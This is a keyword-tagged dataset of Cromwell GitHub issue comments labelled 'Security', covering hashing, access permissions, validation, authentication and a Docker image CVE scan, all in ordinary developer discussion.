Security,"Another example of a workflow complete failure possibly due to grabbing the hash from google. Workflow 0c7da038-172a-4081-8850-c87fec05f4c1. ```; 2016-04-26 20:52:05,279 cromwell-system-akka.actor.default-dispatcher-28 ERROR - WorkflowActor [UUID(0c7da038)]: Completion work failed for call HaplotypeCaller:46.; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:76,hash,hash,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,Another few thoughts to the person who picks this up -> this bug likely also exists on whatever initial validation is being done for CWL files as they can also be json but presumably are being run through a yaml parser,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379232557:104,validat,validation,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379232557,1,['validat'],['validation']
Security,"Anyone have a concrete solution to this, we are also getting the permission denied error with our aws batch setup. We have even included chmod 777 in the cloud init script to ensure that directory is accessible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-531922228:200,access,accessible,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-531922228,1,['access'],['accessible']
Security,"Apologies, but I can not currently access jira. First time user question:. # The problem. When running `cromwell` locally, I get an excessive number of messages (thousands) from `liquibase`. Here is an example:. ```; Jan 31, 2022 5:36:07 PM liquibase.changelog; INFO: Custom SQL executed; Jan 31, 2022 5:36:07 PM liquibase.changelog; INFO: ChangeSet metadata_changesets/remove_non_summarizable_metadata_from_queue.xml::delete_non_summarizable_metadata_from_queue::mcovarr ran successfully in 1ms; Jan 31, 2022 5:36:07 PM liquibase.changelog; INFO: Index IX_WORKFLOW_METADATA_SUMMARY_ENTRY_MAS dropped from table WORKFLOW_METADATA_SUMMARY_ENTRY; ```. Is it possible to control these from cromwell? Is this a liquibase issue? ; The standard `-DLOG_LEVEL=WARN` does not seem to effect log messages. - Version: cromwell-74.jar; - Backend: local ; - Java version: 17.0.2+8 (azul). ## Workflow:; ```wdl; version 1.0. task say_hello {; input {; String name; }. command {; set -euxo pipefail; echo ""Hello ~{name}""; echo ""Hello ~{name}"" > greeting.txt; }. output {; File greeting = ""greeting.txt""; }. runtime {; docker: ""debian:bullseye-slim""; }; }. workflow hello {; input {; String name; }. call say_hello {; input: ; name = name; }. output {; File greeting = say_hello.greeting; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6664:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6664,1,['access'],['access']
Security,Appears to be a good case for retry love:. ```; java.io.IOException: Failed to upload authentication file; at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializati\; onActor$$writeAuthenticationFile$1.apply(JesInitializationActor.scala:61); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializati\; onActor$$writeAuthenticationFile$1.apply(JesInitializationActor.scala:58); at scala.Option.foreach(Option.scala:257); at cromwell.backend.impl.jes.JesInitializationActor.cromwell$backend$impl$jes$JesInitializationActor$$\; writeAuthenticationFile(JesInitializationActor.scala:58); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.\; scala:52); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.apply(JesInitializationActor.\; scala:51); at scala.util.Try$.apply(Try.scala:192); at cromwell.backend.impl.jes.JesInitializationActor.beforeAll(JesInitializationActor.scala:51); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(\; BackendWorkflowInitializationActor.scala:156); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$initSequence$1$$anonfun$apply$1.apply(\; BackendWorkflowInitializationActor.scala:155); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91\; ); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(Bloc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2009:86,authenticat,authentication,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2009,1,['authenticat'],['authentication']
Security,"Apropos: http://blog.threatstack.com/useful-scalac-options-for-better-scala-development-part-1. Although as @mcovarr pointed out, IntelliJ does a good job of flagging this stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1282#issuecomment-239239863:21,threat,threatstack,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1282#issuecomment-239239863,1,['threat'],['threatstack']
Security,"Are any of the inputs you're using located in a bucket with requester pays turned on ?; It is also recommended to set the `project` key in your `gcs` filesystem to the google project you want requester pays bucket accesses to be billed to.; e.g:; ```; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; project = ""bioinfo-XXXXXXX""; }; ```; For both the engine and backend `filesystems.gcs` stanza.; More information [here](https://cromwell.readthedocs.io/en/develop/filesystems/GoogleCloudStorage/#requester-pays)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-434809921:214,access,accesses,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-434809921,1,['access'],['accesses']
Security,"As `WomValue` can now be represented in `WomExpression` using `ValueAsExpression`, this validation was reinstated.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2954:88,validat,validation,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2954,1,['validat'],['validation']
Security,"As a **user accessing CaaS**, I want **to query a Collection of workflows**, so that I can **view the status of many workflows at once and get the results quickly**.; - Effort: **Medium**; - Risk: **Small to Medium**; - Business value: **Medium to Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212:12,access,accessing,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212,1,['access'],['accessing']
Security,"As a **user of all types**, I want **to read documentation about how to access logs**, so that I can **debug my issues, whether they are within the workflow or outside of it**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087:72,access,access,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087,1,['access'],['access']
Security,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:74,hash,hash,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,1,['hash'],['hash']
Security,"As a **user running workflows through a hosted Cromwell**, I want **to be able to authenticate and authorize permissions to my workflows**, so that **my labmates and I can view and take action on the workflows for which we have the right permissions**. - Remaining work: adding Collections to the /Query endpoint",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-345318111:82,authenticat,authenticate,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2127#issuecomment-345318111,2,"['authenticat', 'authoriz']","['authenticate', 'authorize']"
Security,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:74,hash,hashes,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['hash'],['hashes']
Security,"As a **workflow runner**, I want **certain parameters to be ignored in the hashing process**, so that I can **call cache on more workflows when the result is exactly the same**.; - Effort: **?**; - Risk: **Medium** ; - We should err on the side of hashing a workflow differently if we are not absolutely confident that the parameter does not impact the result.; - Which parameters are ignored is NOT user-editable. This is to prevent users from accidentally ignoring parameters that do impact the result.; - Business value: **Medium**. Some parameters, such as `preemptible_attempts` and `CPU`, don't affect the outcome of the workflow but workflows with different CPU values will not call cache. @LeeTL1220 and @geoffjentry to provide additional thoughts and context if helpful.; Related issue #1210",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604:75,hash,hashing,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604,2,['hash'],['hashing']
Security,"As a WDL author, I would like to be able to write a sub workflow and call it from my main workflow as a subworkflow. I would like the main workflow to be backwards compatible, so I would like to use a keyword modifier to flag the _other_ workflows as being non-primary. . E.g. perhaps the keyword `sub` so I would write `sub workflow { //blah }`. Since these workflows would be callable when they are included via an import I'd prefer to not have a keyword like `private` since that implies visibility/access",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1475:502,access,access,502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1475,1,['access'],['access']
Security,"As a part of supporting sub-workflows, workflow outputs need to behave similarly to task outputs. Task outputs are defined as typed variable declarations (e.g. File myout = ""${foo}.bam""). Currently workflow outputs just ""expose"" the outputs of tasks, and operate more like a whitelist or filter. You can not fabricate a workflow output based on a task output (like the about myout example). However, this should still be backwards compatible with the current definitions. For example you can write:. `output {; task.value; }`. However, we should be able to allow this as syntactic sugar by inferring the type of this from the task definition. For example if this was a File, the above would be the same as `File task.value = task.value`. `output {; File task.value = task.value; }`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1473:221,expose,expose,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1473,1,['expose'],['expose']
Security,"As a pipeline author, I don't enjoy having to spin up a VM, with docker in order to do string substitutions on my parameters. In the GOTC pipeline, we do this in order to strip off the extension of the input file in order to get a base-name, which happens ~40 times in a 20-plex workflow. . This causes a real problem because by requiring so many VMs to spun up, we spend more money (although that cost is quite small) but also eat into our quotas and QPS limits, which actually does hurt our scalability. The proposal is to add a new expression language function which allows for regex substitutions:. sub(string, pattern, replacement). For example,. to strip off an extension from a file you could use `sub(filename, "".bam$"","""")`; to swap an extension, you could use `sub(filename, "".bam$"", "".metrics"")`. By being constrained to a regex (unlike an arbitrary code block) we don't have concerns about security or evaluating these in the cromwell engine. This does not eliminate the need for a generally more expressive expression language or user defined functions, but does solve a large class of common usages that impact ease of use and performance",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/597:901,secur,security,901,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/597,1,['secur'],['security']
Security,"As a user who runs large scale pipelines in Google, I may run into quota limitations on external IP addresses as they are consumed by my JES compute VMs. In many cases (using GCR and using GCS only) I would like to have JES create a node without an external IP address. JES has added this feature (see https://cloud.google.com/genomics/reference/rest/v1alpha2/pipelines) through the ""noAddress"" flag. noAddress must be set in both ephermeralPipeline and pipelineArgs. NOTE: Your project must be whitelisted in ""Google Access for Private IPs Early Access Program"". If your project is not whitelisted and you use noAddress, the operation will hang. This should be specified in the WDL as a runtime attribute, similar to the way cpus, memory or preemptible VMs are requested",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1325:518,Access,Access,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1325,2,['Access'],['Access']
Security,"As a user with a controlled file system (like GOTC or the cromwell execution directory) where the I know that a file path is immutable and uniquely identifying, I would like to run the cromwell server in a mode where the file path can be used in call caching rather than computing the actual hash. I will take on the risk that if I break that contract (by modifying files), workflows will not execute properly. I want to do this because it will be a big performance gain when I have many files and I know that their paths are unique. @cjllanwarne gets credit for raising this as a cool feature, @jsotobroad and @dshiga agreed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1271:292,hash,hash,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1271,2,['hash'],['hash']
Security,"As background, we run cromwell server behind an authenticating proxy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2583#issuecomment-325881488:48,authenticat,authenticating,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2583#issuecomment-325881488,1,['authenticat'],['authenticating']
Security,"As discussed in https://github.com/broadinstitute/cromwell/issues/6235, developers of workflows for GCP who store their images in Google Container Repositories can be exposed to large Google GCS egress charges when users attempt to run workflows in different continental regions, resulting in many trans-continental container pulls. There currently does not seem to be a satisfactory way to guard against this:. - We can't make our image repositories private because we want to make the workflows available to the public via Terra.; - We can't make the repositories requester-pays because the pipelines API does not support pulling images from requester-pays repositories.; - We can mirror our repositories to different regions, but we are still dependent on our users to configure their workflows to point to the right region and take good-faith extra steps to help us avoid these charges. Some possible ideas were suggested by @freeseek in https://github.com/broadinstitute/cromwell/issues/6235:. - Convince Google to support requester-pays buckets for container pulls in PAPI.; - Modify some combination of Cromwell/PAPI to cache images rather than pulling them for each task that is run.; - Develop infrastructure within Cromwell to know what region the workflow is running in and automatically select the right GCR mirror to pull from.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442:167,expose,exposed,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442,1,['expose'],['exposed']
Security,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:297,password,password,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392,4,"['access', 'password']","['access', 'password']"
Security,"As explained in issue [#4304](https://github.com/broadinstitute/cromwell/issues/4304) now, it seems like the following three roles are required to run Cromwell with the PAPIv2 backend:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (`lifesciences.workflowsRunner`); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (`iam.serviceAccountUser`); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (`storage.objectAdmin`). Rather than the roles `storage.objectCreator` `storage.objectViewer` `genomics.pipelinesRunner` `genomics.admin` `iam.serviceAccountUser` `storage.objects.create` as explained in the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-680282969:264,access,access-control,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-680282969,2,['access'],['access-control']
Security,As extra `womtool validate` test to make sure WDL 1.0 is catching this. Unfortunately there's no draft-2 equivalent of this test yet because of the bug spotted in #4550,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4554:18,validat,validate,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4554,1,['validat'],['validate']
Security,"As far as I can tell the cromwell server has permission to read from the bucket:. ```; [ec2-user@cromwell-server ~]$ aws s3 cp upload.txt s3://concr-genomics-results; upload: ./upload.txt to s3://concr-genomics-results/upload.txt; [ec2-user@cromwell-server ~]$ aws s3 ls s3://concr-genomics-results; 2018-11-01 10:32:25 0 upload.txt; ```. I also get the same issue when submitting from my workstation, which also has AWS authentication to read and write from the bucket. . Is there another setting I might be missing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435000768:421,authenticat,authentication,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435000768,1,['authenticat'],['authentication']
Security,"As far as I remember, in the Past it was possible to reference global workflow variables inside a task. But now I get wdl validation errors like this:; ```; ERROR: Variable genome does not reference any declaration in the task (line 36, col 27):. curl -z ${folder}""/""${genome} --max-time 10 --retry 3 --retry-delay 1 ${genomeURL}; ^. Task defined here (line 26, col 6):. task download_genome {; ```; Here is the wdl; ```wdl; workflow indexes {. File genomesFolder; String version #release version; String species #species and also name of the index/. String releaseURL #path to releseas. String transcriptome #relative file name (.fa.gz); String genome #relative file name (.fa.gz); String annotation #relative annotation file name (.gtf). call download_genome {; input:; genomeURL = releaseURL + ""/"" + genome,; transcriptomeURL = releaseURL + ""/"" + transcriptome,; annotationURL = releaseURL + ""/"" + annotation,; folder = genomesFolder + ""/"" + species + ""/"" + version; }. }. task download_genome {. String genomeURL; String transcriptomeURL; String annotationURL; String folder. command {; mkdir -p ${folder}; curl -z ${folder}""/""${genome} --max-time 10 --retry 3 --retry-delay 1 ${genomeURL}; curl -z ${folder}""/""${transcriptome} --max-time 10 --retry 3 --retry-delay 1 ${transcriptomeURL}; curl -z ${folder}""/""${annotation} --max-time 10 --retry 3 --retry-delay 1 ${annotationURL}; }. }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2504:122,validat,validation,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2504,1,['validat'],['validation']
Security,As for; ```; PAPI error code 7. Required 'compute.zones.list' permission for 'projects/xxx'; ```; it sounds like you need to access Google Cloud Console and enable this permission for your project (Cromwell cannot perform this step for you automatically),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872:125,access,access,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872,1,['access'],['access']
Security,"As most of biological containers (like http://biocontainers.pro) are hosted at quay.io it will be useful to get docker hash from there for call caching. Right now with the latest release I get the following message:; """"""; Cromwell attempted to retrieve the current hash for this docker image but failed.\nThis is not necessarily a cause for concern as Cromwell is currently only able to retrieve hashes for Dockerhub and GCR images.\nThe job will be dispatched to the appropriate backend that will attempt to run it.; """"""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2252:119,hash,hash,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2252,3,['hash'],"['hash', 'hashes']"
Security,As part of auditing our Codecov secrets leak I am trying to trim down the number of items we maintain in Vault. This changeset allows us to delete `secret/dsde/cromwell/common/cromwell-refresh-token`.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6331:11,audit,auditing,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6331,1,['audit'],['auditing']
Security,"As pointed out by @davidbernick, there are some vulnerabilities in Cromwell's docker image. Beyond that, it's a good idea to periodically update the underlying image. This is not deemed to be a critical issue (yet) from a security perspective, but we should make sure to clear this up when we get a chance. $ docker run -it --rm -e CLAIR_ADDR=http://clair.bits-infosec.broadinstitute.org:6060 -e CLAIR_OUTPUT=High -e CLAIR_THRESHOLD=10 -e DOCKER_USER=davidbernick -e DOCKER_PASSWORD='xxxxx' broadinstitute/klar broadinstitute/cromwell:dev; clair timeout 1m0s; docker timeout: 1m0s; no whitelist file; Analysing 10 layers; Got results from Clair API v1; Found 139 vulnerabilities; Unknown: 3; Negligible: 47; Low: 38; Medium: 44; High: 7. CVE-2017-12424: [High] ; Found in: shadow [1:4.4-4.1]; Fixed By: ; In shadow before 4.5, the newusers tool could be made to manipulate internal data structures in ways unintended by the authors. Malformed input may lead to crashes (with a buffer overflow or other memory corruption) or other unspecified behaviors. This crosses a privilege boundary in, for example, certain web-hosting environments in which a Control Panel allows an unprivileged user account to create subaccounts.; https://security-tracker.debian.org/tracker/CVE-2017-12424; -----------------------------------------; CVE-2018-13347: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; mpatch.c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; htt",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:222,secur,security,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,1,['secur'],['security']
Security,"As side quests, this included:. * No longer requiring inputs in order to build a `WomBundle` (what `wom graph` really wants, and what imports should really produce).; * A second step to go from `WomBundle` to `WomExecutable`/`ValidatedWomNamespace`; * Fixing draft 3 input processing in the `LanguageFactory`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3323:226,Validat,ValidatedWomNamespace,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3323,1,['Validat'],['ValidatedWomNamespace']
Security,As you see on the screenshot all pairs are highlighted as errors in Intellij while wdltool validates everything without an issue.; ![pair_highlightning_error](https://cloud.githubusercontent.com/assets/842436/25742086/783c9136-3196-11e7-8649-9fd5e1403b70.png),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2246:91,validat,validates,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2246,1,['validat'],['validates']
Security,"Assigning myself since the MySQL upgrade is the underlying cause. Here is the command sequence I use to create a new local DB for use by a fresh, totally default Cromwell checkout.; ```; docker run --name=mysql1 -p 3306:3306 -d mysql/mysql-server:latest; docker logs mysql1 # copy the auto generated password; docker exec -it mysql1 mysql -uroot -p # paste in the password from the previous stpe; ALTER USER 'root'@'localhost' IDENTIFIED BY '';; CREATE database cromwell_test;; CREATE USER 'root'@'%' IDENTIFIED BY '';; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;; FLUSH PRIVILEGES;; ```; I just validated it still works with recent versions, so it seems my theory about Docker using UTC is correct.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4803#issuecomment-480417841:300,password,password,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4803#issuecomment-480417841,3,"['password', 'validat']","['password', 'validated']"
Security,Assuming this was reported against prod FC I'll figure out what hash they're currently using and try again with that.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425171488:64,hash,hash,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425171488,1,['hash'],['hash']
Security,"AsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnec",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2079,secur,security,2079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"At least ""allows result reuse"" and ""results cloned"" (the latter being transformed from an fk to a boolean). Returning hashes might be helpful too for diagnosing why executions don't avoid.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/559:118,hash,hashes,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/559,1,['hash'],['hashes']
